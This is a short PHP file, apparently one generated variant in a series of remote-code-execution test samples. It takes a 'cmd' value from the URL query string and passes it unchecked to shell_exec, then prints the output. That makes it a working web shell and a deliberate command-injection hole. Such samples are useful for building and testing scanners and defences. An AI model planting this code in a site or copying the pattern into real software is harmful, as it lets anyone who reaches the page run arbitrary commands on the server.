<?php
// RCE test variation #693
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>